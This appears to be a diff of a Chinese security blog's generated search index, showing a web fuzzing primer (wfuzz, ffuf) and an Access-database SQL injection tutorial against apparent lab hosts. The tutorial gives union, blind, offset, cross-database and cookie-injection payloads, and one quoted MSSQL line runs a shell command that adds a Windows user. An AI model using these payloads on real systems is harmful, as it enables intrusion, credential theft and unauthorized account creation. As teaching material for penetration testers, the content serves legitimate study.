-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -z file,1.txt,base64 -b “cookie=”FUZZ” http://www.xxx.com”</span><br></pre></td></tr></table></figure>
-
-<p>探测目录</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -z file,common.txt -R 2 -f 2.html,html http://www.baidu.com/FUZZ</span><br></pre></td></tr></table></figure>
-
-<h2 id="FFuF"><a href="#FFuF" class="headerlink" title="FFuF"></a>FFuF</h2><p>ffuf是一款Go语言编写的高速Web Fuzzer工具，该项目深受大型项目gobuster和wfuzz的启发。</p>
-<p>项目地址：<a href="https://github.com/ffuf/ffuf/">https://github.com/ffuf/ffuf/</a></p>
-<p>用法与wfuzz差不多，就不进行具体介绍了。</p>
-<p>具体用法可查看这篇文章：<a href="https://www.cnblogs.com/secxue/p/14617343.html">https://www.cnblogs.com/secxue/p/14617343.html</a></p>
-]]></content>
       <categories>
         <category>Web安全</category>
         <category>扫描与枚举</category>
@@ -1489,6 +1408,87 @@
       </tags>
   </entry>
   <entry>
+    <title>模糊测试初探</title>
+    <url>/2021/10/05/0x02%20%E6%89%AB%E6%8F%8F%E4%B8%8E%E6%9E%9A%E4%B8%BE/11.%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%88%9D%E6%8E%A2/</url>
+    <content><![CDATA[<h2 id="模糊测试介绍"><a href="#模糊测试介绍" class="headerlink" title="模糊测试介绍"></a>模糊测试介绍</h2><p>模糊测试（fuzz testing，fuzzing）是一种软件测试技术，其核心思想是将自动或半自动生成的随机数据输入到一个程序中并监视程序异常，如崩溃、断言失败，以发现可能的程序错误，比如内存泄露。模糊测试常常用于检测软件或计算机系统的安全漏洞。</p>
+<p>可以说，任何以暴力枚举形式的测试都能称为模糊测试。</p>
+<p>漏洞挖掘有三种方法：白盒代码审计、灰盒逆向工程、黑盒测试。其中黑盒的Fuzz测试是效率最高的一种，能够快速验证大量潜在的安全威胁。</p>
+<p>这里只是对一些常用的Web应用Fuzz工具做简单介绍，之后会结合实战进行一个详细地演示。</p>
+<h2 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h2><p>在很多模糊测试场景中，研究人员可能会需要手动输出测试Payload，而BurpSuite 可以帮助我们将整个过程以自动化的方式实现。</p>
+<p>关于BurpSuite的使用已经讲过很多遍了，这里就不多解释了。</p>
+<h2 id="WFuzz"><a href="#WFuzz" class="headerlink" title="WFuzz"></a>WFuzz</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>wfuzz 是一款Python开发的Web安全模糊测试工具。</p>
+<p>项目地址：<a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a></p>
+<p>官方手册：<a href="https://wfuzz.readthedocs.io/en/latest/">https://wfuzz.readthedocs.io/en/latest/</a></p>
+<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><ul>
+<li>暴破文件和路径</li>
+<li>测试URL中的参数</li>
+<li>测试POST请求</li>
+<li>测试Cookies</li>
+<li>测试自定义请求头</li>
+<li>测试HTTP请求方法（动词）</li>
+<li>使用代理</li>
+<li>认证</li>
+<li>递归测试</li>
+<li>测试速度与效率</li>
+<li>输出到文件</li>
+<li>不同的输出</li>
+</ul>
+<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><ul>
+<li>基础语法</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz [options] -z payload,params &lt;url&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>常用参数</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-z  payloads里面的参数（wfuzz -e payloads 可以查看）</span><br><span class="line"></span><br><span class="line"> -z  file,1.txt（以文件形式，导入1.txt）</span><br><span class="line"></span><br><span class="line"> -z  range,1-10（以范围形式，1到10）</span><br><span class="line"></span><br><span class="line"> -z  list,1-2-3-10（列表形式，1,2,3,10）</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-d   设定POST量</span><br><span class="line"></span><br><span class="line"> -d  “uname=admin&amp;passwd=admin”</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-b   设定cookie量</span><br><span class="line"></span><br><span class="line"> -b  “cookie=”</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-H  设定头部信息</span><br><span class="line"></span><br><span class="line"> -H  “User-Agent: firfox”</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-X  设定请求方法</span><br><span class="line"></span><br><span class="line"> -X  GET</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-R  递归深度，探测目录很好</span><br><span class="line"></span><br><span class="line"> -R 1（深度为1）</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-t   并发数 / -s  请求间隔时间  （这个主要是防拉黑，比如我要fuzz狗）</span><br><span class="line"></span><br><span class="line"> -t 3 -s 5</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-f   输出到文件的格式，格式有raw,json,csv,magictree,html</span><br><span class="line"></span><br><span class="line"> -f /tmp/1,html （将结果输出到tmp目录下的1，以html格式）</span><br></pre></td></tr></table></figure>
+
+<p>输出的结果信息解析：</p>
+<p>结果信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ID：测试时的请求序  </span><br><span class="line"></span><br><span class="line">Response：HTTP响应码			C</span><br><span class="line"></span><br><span class="line">Lines：响应信息中的行数      	 L</span><br><span class="line"></span><br><span class="line">Word：响应信息中的字数         	 W</span><br><span class="line"></span><br><span class="line">Chars：响应信息中的字符数       	H</span><br><span class="line"></span><br><span class="line">Payload：当前使用的payload</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">隐藏结果  --hc  --hl  --hw  --hh </span><br><span class="line"></span><br><span class="line"> 隐藏响应码405  --hc 405 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">显示结果   --sc  --sl  --sw  --sh</span><br><span class="line"></span><br><span class="line"> 显示响应码405  --sc 405</span><br></pre></td></tr></table></figure>
+
+<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>遍历id值隐藏500返回码并保存为html文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -z range,1-200 --hc 500 -f 1,html http://www.XXX.net/Pro_show.asp?proid=FUZZ</span><br></pre></td></tr></table></figure>
+
+<p>需要一次测试多个FUZZ</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -z file,1.txt -z file,2.txt  http://www.xxx.com/FUZZ/FUZ2Z.html</span><br></pre></td></tr></table></figure>
+
+<p>对于需要base64加密的cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -z file,1.txt,base64 -b “cookie=”FUZZ” http://www.xxx.com”</span><br></pre></td></tr></table></figure>
+
+<p>探测目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -z file,common.txt -R 2 -f 2.html,html http://www.baidu.com/FUZZ</span><br></pre></td></tr></table></figure>
+
+<h2 id="FFuF"><a href="#FFuF" class="headerlink" title="FFuF"></a>FFuF</h2><p>ffuf是一款Go语言编写的高速Web Fuzzer工具，该项目深受大型项目gobuster和wfuzz的启发。</p>
+<p>项目地址：<a href="https://github.com/ffuf/ffuf/">https://github.com/ffuf/ffuf/</a></p>
+<p>用法与wfuzz差不多，就不进行具体介绍了。</p>
+<p>具体用法可查看这篇文章：<a href="https://www.cnblogs.com/secxue/p/14617343.html">https://www.cnblogs.com/secxue/p/14617343.html</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>扫描与枚举</category>
+      </categories>
+      <tags>
+        <tag>扫描与枚举</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>防护扫描与服务枚举</title>
     <url>/2021/10/05/0x02%20%E6%89%AB%E6%8F%8F%E4%B8%8E%E6%9E%9A%E4%B8%BE/3.%E9%98%B2%E6%8A%A4%E6%89%AB%E6%8F%8F%E4%B8%8E%E6%9C%8D%E5%8A%A1%E6%9E%9A%E4%B8%BE/</url>
     <content><![CDATA[<h2 id="防火墙识别"><a href="#防火墙识别" class="headerlink" title="防火墙识别"></a>防火墙识别</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>防火墙(Firewall):防火墙指的是一个由软件和硬件设备组合而成、在内部网和外部网之间、专用网与公共网之间的边界上构造的保护屏障。防火墙是一种保护计算机网络安全的技术性措施，它通过在网络边界上建立相应的网络通信监控系统来隔离内部和外部网络，以阻挡来自外部的网络入侵。</p>
@@ -1718,7 +1718,7 @@
 <h4 id="匹配替换"><a href="#匹配替换" class="headerlink" title="匹配替换"></a>匹配替换</h4><p>此项配置主要用来自动替换请求消息和服务器端返回消息中的某些值和文本，它与前文的规则的不同之处还在于支持正则表达式语言。</p>
 <p><img src="https://i.loli.net/2021/10/05/nsrzJ6l7EXmgDyF.png" alt="img"></p>
 <p>针对的是所有请求包，可以把特定字符替换成其他的字符。</p>
-<p>当点击【Add】按钮时，在弹出的匹配或替换规则输入对话框中我们可以看到，它可以对请求和返回消息的消息头，消息体、请求参数名、请求参数值、请求的第一行进行匹配和替换。例如，当我们要替换所有返回消息中的邮箱地址为<a href="mailto:&#x74;&#x30;&#100;&#x61;&#x74;&#x61;&#64;&#98;&#117;&#114;&#112;&#x73;&#x75;&#105;&#116;&#x65;&#x2e;&#99;&#111;&#109;">&#x74;&#x30;&#100;&#x61;&#x74;&#x61;&#64;&#98;&#117;&#114;&#112;&#x73;&#x75;&#105;&#116;&#x65;&#x2e;&#99;&#111;&#109;</a>时，可以参考下图的设置填写输入项并保存验证。</p>
+<p>当点击【Add】按钮时，在弹出的匹配或替换规则输入对话框中我们可以看到，它可以对请求和返回消息的消息头，消息体、请求参数名、请求参数值、请求的第一行进行匹配和替换。例如，当我们要替换所有返回消息中的邮箱地址为<a href="mailto:&#116;&#x30;&#100;&#x61;&#x74;&#x61;&#64;&#98;&#x75;&#x72;&#x70;&#115;&#117;&#105;&#116;&#x65;&#46;&#99;&#111;&#109;">&#116;&#x30;&#100;&#x61;&#x74;&#x61;&#64;&#98;&#x75;&#x72;&#x70;&#115;&#117;&#105;&#116;&#x65;&#46;&#99;&#111;&#109;</a>时，可以参考下图的设置填写输入项并保存验证。</p>
 <p><img src="https://i.loli.net/2021/10/05/GxIFETiBWMAU4yv.png" alt="img"></p>
 <p><img src="https://i.loli.net/2021/10/05/bsuBRLTwGeNMKAo.png" alt="img"></p>
 <p>支持正则表达式匹配！！！</p>
@@ -2563,6 +2563,143 @@
       </tags>
   </entry>
   <entry>
+    <title>Access数据库注入攻击方式_</title>
+    <url>/2021/10/06/0x03%20SQL%E6%B3%A8%E5%85%A5/4.Access%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F_/</url>
+    <content><![CDATA[<h2 id="Access数据库基本知识"><a href="#Access数据库基本知识" class="headerlink" title="Access数据库基本知识"></a>Access数据库基本知识</h2><h3 id="Access数据库介绍"><a href="#Access数据库介绍" class="headerlink" title="Access数据库介绍"></a>Access数据库介绍</h3><p>Microsoft Office Access是由微软发布的关系数据库管理系统。它结合了 Microsoft Jet Database Engine 和 图形用户界面两项特点，是 Microsoft Office 的系统程序之一。</p>
+<p>Microsoft Office Access是微软把数据库引擎的图形用户界面和软件开发工具结合在一起的一个数据库管理系统。它是微软OFFICE的一个成员, 在包括专业版和更高版本的office版本里面被单独出售。2018年9月25日,最新的微软Office Access 2019在微软Office 2019里发布。 MS ACCESS以它自己的格式将数据存储在基于Access Jet的数据库引擎里。它还可以直接导入或者链接数据(这些数据存储在其他应用程序和数据库)。</p>
+<h3 id="Access数据库的特点"><a href="#Access数据库的特点" class="headerlink" title="Access数据库的特点"></a>Access数据库的特点</h3><p>Access以它自己的格式将数据存储在基于Access Jet的数据库引擎里。Access数据库属于文件型数据库，所以不需要端口号。</p>
+<p>在Office 2007之前的Access数据库文件的后缀是 <strong>.mdb</strong> ，Office2007及其之后的Access数据库文件的后缀是 <strong>.accdb</strong> 。</p>
+<p>Access数据库中没有注释符号，因此 /**/ 、 – 和 # 都没法使用。</p>
+<p>Access是小型数据库，当容量到达100M左右的时候性能就会开始下降。</p>
+<p>Access数据库不支持错误显示注入，Access数据库不能执行系统命令。</p>
+<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> len(&quot;string&quot;)        查询给定字符串的长度</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">asc</span>(&quot;a&quot;)             查询给定字符串的ascii值</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> mid(&quot;string&quot;,<span class="number">2</span>,<span class="number">1</span>)    查询给定字符串从指定索引开始的长度</span><br><span class="line"></span><br><span class="line">top  n                      查询前n条记录</span><br></pre></td></tr></table></figure>
+
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>可以使用如下方法来判断：</p>
+<ul>
+<li>特殊符号，\、/、’、”等。</li>
+<li>-0 减数字看是否变化。</li>
+<li>逻辑关系，<code>and 1=1</code> <code>and 1=2</code></li>
+</ul>
+<h3 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h3><p>asp一般搭载access或者mssql，首先得判断出来是哪一类数据库。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and exists (select * from msysobjects)</span><br></pre></td></tr></table></figure>
+
+<p>正常回显即为access数据库，如果报错可看报错信息来判断是否在access数据库。</p>
+<p>报出以下错误说明该数据库存在<code>msysobjects</code>这张数据表，说明该数据库为Access</p>
+<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/37626e4fe2f47655dcf67dfcea2d3bc2.png" alt="37626e4fe2f47655dcf67dfcea2d3bc2.png"></p>
+<p>下面这个为sqlserver的判断语句</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and exists(select * from sysobjects)</span><br></pre></td></tr></table></figure>
+
+<h3 id="猜表名与字段名"><a href="#猜表名与字段名" class="headerlink" title="猜表名与字段名"></a>猜表名与字段名</h3><p><strong>猜解表名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and exists(select * from admin)</span><br></pre></td></tr></table></figure>
+
+<p><strong>猜解字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and exists(select user from admin)</span><br></pre></td></tr></table></figure>
+
+<p>由于access的系统表不像mysql一样具有系统索引库，所以表名和列名都只能靠猜……如果通过社工、工具、经验（比如看后台源码的表单名字）都搞不出来的话，就只能通过偏移注入来试试运气了。</p>
+<h3 id="逐字猜解数据"><a href="#逐字猜解数据" class="headerlink" title="逐字猜解数据"></a>逐字猜解数据</h3><p><strong>猜解一张表中有多少条记录</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select count(*) from admin)&gt;3</span><br></pre></td></tr></table></figure>
+
+<p><strong>猜解字段内容长度</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select len(user) from admin)=5</span><br></pre></td></tr></table></figure>
+
+<p><strong>猜解字段内容数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select top 1 asc(mid(user,1,1)) from admin)&gt;95</span><br></pre></td></tr></table></figure>
+
+<h2 id="联合查找注入"><a href="#联合查找注入" class="headerlink" title="联合查找注入"></a>联合查找注入</h2><h3 id="判断查询列数"><a href="#判断查询列数" class="headerlink" title="判断查询列数"></a>判断查询列数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by 11</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/90342b450e3ec99476523036222783f6.png" alt="90342b450e3ec99476523036222783f6.png"></p>
+<h3 id="判断回显位"><a href="#判断回显位" class="headerlink" title="判断回显位"></a>判断回显位</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,4,5,6,7,8,9,10,11 from admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/29085dfd90b5fd67fd8f7629d1c850be.png" alt="29085dfd90b5fd67fd8f7629d1c850be.png"></p>
+<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,s_user,s_pwd,6,7,8,9,10,11 from admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/852a57eed1f78e57db355b80fe3504f2.png" alt="852a57eed1f78e57db355b80fe3504f2.png"></p>
+<h2 id="偏移注入"><a href="#偏移注入" class="headerlink" title="偏移注入"></a>偏移注入</h2><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><p>在SQL注入的时候会遇到一些无法查询列名的问题，比如系统自带数据库的权限不够而无法访问系统自带库。</p>
+<p>当你猜到表名无法猜到字段名的情况下，我们可以使用偏移注入来查询那张表里面的数据。</p>
+<h3 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h3><ul>
+<li>假设一个表有8个字段，admin表有3个字段。</li>
+<li>联合查询payload：union select 1,2,3,4,5,6,7,8 from admin</li>
+<li>在我们不知道admin有多少字段的情况下可以尝试payload：<code>union select 1,2,3,4,5,6,7,admin.* from admin</code>，此时页面出错</li>
+<li>直到payload：<code>union select 1,2,3,4,5,admin.* from admin</code>时页面返回正常，说明admin表有三个字段</li>
+<li>然后通过移动admin.*的位置，就可以回显不同的数据</li>
+</ul>
+<h3 id="判断查询列数-1"><a href="#判断查询列数-1" class="headerlink" title="判断查询列数"></a>判断查询列数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by 38</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/12bb577bfb8ed7fd6e22b1cc1f798ebf.png" alt="12bb577bfb8ed7fd6e22b1cc1f798ebf.png"></p>
+<h3 id="判断回显位-1"><a href="#判断回显位-1" class="headerlink" title="判断回显位"></a>判断回显位</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38 from admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/dcd9b04d83b81ddf09a3a1bfa647925e.png" alt="dcd9b04d83b81ddf09a3a1bfa647925e.png"></p>
+<h3 id="判断表内存在的字段个数"><a href="#判断表内存在的字段个数" class="headerlink" title="判断表内存在的字段个数"></a>判断表内存在的字段个数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,* from admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/06b7c720180477547b3b2f9462601179.png" alt="06b7c720180477547b3b2f9462601179.png"></p>
+<p>发现报错，我们将<code>*</code>位向左移，直到回显正常</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8204/show.asp?pkid=4821 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,* from admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="/:/f06a8c98c2fc458f905a8d7c9bf9c5ee" alt="2ee3f68b1695aa7ba65e3ae2a5c67109.png"></p>
+<p>发现<code>*</code>在27之后可以正常回显，计算表内查询字段数：38-27=<strong>11</strong></p>
+<p>其中还报出了一个数据：admin</p>
+<h3 id="偏移注入爆出数据"><a href="#偏移注入爆出数据" class="headerlink" title="偏移注入爆出数据"></a>偏移注入爆出数据</h3><blockquote>
+<p>偏移注入公式：</p>
+<ul>
+<li>查询字段数：* = 11</li>
+<li>一级偏移数：38 - 11 = 27</li>
+<li>二级偏移数：38 - 11×2 = 16</li>
+<li>三级偏移数：38 - 11×3 = 5</li>
+</ul>
+</blockquote>
+<p><strong>二级偏移</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from (admin as a inner join admin as b on a.id=b.id)</span><br></pre></td></tr></table></figure>
+
+<p>发现多爆出一个数据（虽然没什么用）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/83ce49b0e9d2e2eaeb1a96332cdeac26.png" alt="83ce49b0e9d2e2eaeb1a96332cdeac26.png"></p>
+<p><strong>三级偏移</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,4,5,* from ((admin as a inner join admin as b on a.id=b.id) inner join admin as c on a.id=c.id)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/21ac4b9cbc6904c04613f41ee3e3664e.png" alt="21ac4b9cbc6904c04613f41ee3e3664e.png"></p>
+<h2 id="跨库查询"><a href="#跨库查询" class="headerlink" title="跨库查询"></a>跨库查询</h2><p>同服务器下的站点有注入，知道对方站的数据库绝对路径，知道对方数据库表，表中的字段名可以用这个方法来进行跨库查询。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,admin,3,password,5,6,7,8,9,10,11,12,13,14 from [C:\WebCode\sze7xiaohu.mdb].admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/c8ac1fe68934b7a264a31c9fe0061ca8.png" alt="c8ac1fe68934b7a264a31c9fe0061ca8.png"></p>
+<h2 id="Cookie手工注入"><a href="#Cookie手工注入" class="headerlink" title="Cookie手工注入"></a>Cookie手工注入</h2><p>cookie注入的原理其实并不复杂。学过ASP语言的应该都知道，在ASP中 例如：</p>
+<p><code>id=request.querystring(ID);</code> <code>id=request.form(ID);</code></p>
+<p>在正常情况下程序员应该按以上规范进行代码的编写，但是部分程序员，为了方便却将代码写成了如下格式：</p>
+<p><code>id=request(ID);</code></p>
+<p>虽然此时也加了防注入程序。但是，防注入程序并不支持基于cookie提交的数据。而此时代码由于接受任何提交方式，从而导致了cookie注入的产生！下面我来简单演示下cookie手工注入的过程。</p>
+<p>首先，我们在存在cookie注入的页面，按其正常地址进行一次完整的访问。完整访问是为了收集其cookie。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/00bb0ba54e30d917e0d075f1930909f6.png" alt="00bb0ba54e30d917e0d075f1930909f6.png"></p>
+<p>接着，我们使用JS代码在地址栏将原先的地址替换为如下代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;26&quot;));</span><br></pre></td></tr></table></figure>
+
+<p>注：不能直接粘贴，直接粘贴浏览器会自动查询，可以先手动输入javascrip:再粘贴后面的部分。火狐浏览器不支持地址栏JavaScript伪协议，可以在Chrome浏览器中使用。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/01faa58d37eff6773bc66d514473c264.png" alt="01faa58d37eff6773bc66d514473c264.png"></p>
+<p>此时，我们打开一个新页面，将之前存在注入的页面地址拷贝到地址栏。注意：这里将后面的id 参数去除后，再进行访问！如图。页面如果依然返回正常，则说明cookie 修改成功！</p>
+<h3 id="构造Cookie注入页面与判断注入点"><a href="#构造Cookie注入页面与判断注入点" class="headerlink" title="构造Cookie注入页面与判断注入点"></a>构造Cookie注入页面与判断注入点</h3><p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/67fb74e1e860392e2ac9597189b985a5.png" alt="67fb74e1e860392e2ac9597189b985a5.png"></p>
+<p>and 1=1</p>
+<p>刷新后页面正常显示</p>
+<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061042627.png" alt="37d851bb273e68857fe54f2f04aa5a80.png"></p>
+<p>and 1=2</p>
+<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/f920179cb4bbe8e702f0d83f2e5cd977.png" alt="f920179cb4bbe8e702f0d83f2e5cd977.png"></p>
+<p>刷新后页面报错</p>
+<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061043124.png" alt="bb70c283af7fd32c357d10c6060c6446.png"></p>
+<p>在证明确实存在注入后，我们就可以开始猜它的列数了。</p>
+<h3 id="判断查询列数-2"><a href="#判断查询列数-2" class="headerlink" title="判断查询列数"></a>判断查询列数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;26 order by 11&quot;));</span><br></pre></td></tr></table></figure>
+
+<h3 id="判断回显位-2"><a href="#判断回显位-2" class="headerlink" title="判断回显位"></a>判断回显位</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;26 union select 1,2,3,4,5,6,7,8,9,10,11 from admin&quot;));</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取数据-1"><a href="#获取数据-1" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;26 union select 1,username,password,4,5,6,7,8,9,10,11 from admin&quot;));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/ee9bf1be05fbedb60937a69027ca9399.png" alt="ee9bf1be05fbedb60937a69027ca9399.png"></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>MySQL数据库注入攻击方式</title>
     <url>/2021/10/06/0x03%20SQL%E6%B3%A8%E5%85%A5/3.MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</url>
     <content><![CDATA[<h2 id="MySQL数据库基本知识"><a href="#MySQL数据库基本知识" class="headerlink" title="MySQL数据库基本知识"></a>MySQL数据库基本知识</h2><h3 id="MySQL数据库介绍"><a href="#MySQL数据库介绍" class="headerlink" title="MySQL数据库介绍"></a>MySQL数据库介绍</h3><p>MySQL 是最流行的关系型数据库管理系统，在 WEB 应用方面 MySQL 是最好的 RDBMS(Relational Database Management System：关系数据库管理系统)应用软件之一。</p>
@@ -3374,143 +3511,6 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:\windows\system32\ias\ias.mdb&#x27;,&#x27;select shell(&quot;cmd.exe /c net user estelle 123456 /add&quot;)&#x27;)</span><br></pre></td></tr></table></figure>
 
 <p>注：该方法在32位系统下会出错</p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Access数据库注入攻击方式_</title>
-    <url>/2021/10/06/0x03%20SQL%E6%B3%A8%E5%85%A5/4.Access%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F_/</url>
-    <content><![CDATA[<h2 id="Access数据库基本知识"><a href="#Access数据库基本知识" class="headerlink" title="Access数据库基本知识"></a>Access数据库基本知识</h2><h3 id="Access数据库介绍"><a href="#Access数据库介绍" class="headerlink" title="Access数据库介绍"></a>Access数据库介绍</h3><p>Microsoft Office Access是由微软发布的关系数据库管理系统。它结合了 Microsoft Jet Database Engine 和 图形用户界面两项特点，是 Microsoft Office 的系统程序之一。</p>
-<p>Microsoft Office Access是微软把数据库引擎的图形用户界面和软件开发工具结合在一起的一个数据库管理系统。它是微软OFFICE的一个成员, 在包括专业版和更高版本的office版本里面被单独出售。2018年9月25日,最新的微软Office Access 2019在微软Office 2019里发布。 MS ACCESS以它自己的格式将数据存储在基于Access Jet的数据库引擎里。它还可以直接导入或者链接数据(这些数据存储在其他应用程序和数据库)。</p>
-<h3 id="Access数据库的特点"><a href="#Access数据库的特点" class="headerlink" title="Access数据库的特点"></a>Access数据库的特点</h3><p>Access以它自己的格式将数据存储在基于Access Jet的数据库引擎里。Access数据库属于文件型数据库，所以不需要端口号。</p>
